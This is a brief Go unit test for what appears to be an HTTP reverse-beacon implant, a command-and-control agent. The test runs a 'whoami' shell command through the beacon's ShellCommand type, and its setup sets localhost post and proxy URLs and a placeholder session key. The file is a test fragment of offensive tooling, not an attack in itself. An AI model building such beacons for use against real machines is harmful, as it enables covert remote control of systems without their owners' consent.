package command

import (
	"http_reverse_beacon/profile"
	"testing"
)

func TestShellCommand(t *testing.T) {
	initTest(t)
	c := ShellCommand{}
	c.Args = []string{"whoami"}
	c.Env = []string{}
	c.Shell()
}

func initTest(t *testing.T) {
	profile.PostUrl = "http://localhost:80/test"
	profile.ProxyUrl = "http://localhost:8080"
	profile.SessionKey = []byte("1234567812345678")
	profile.RandomIV = []byte("1234567812345678")
}
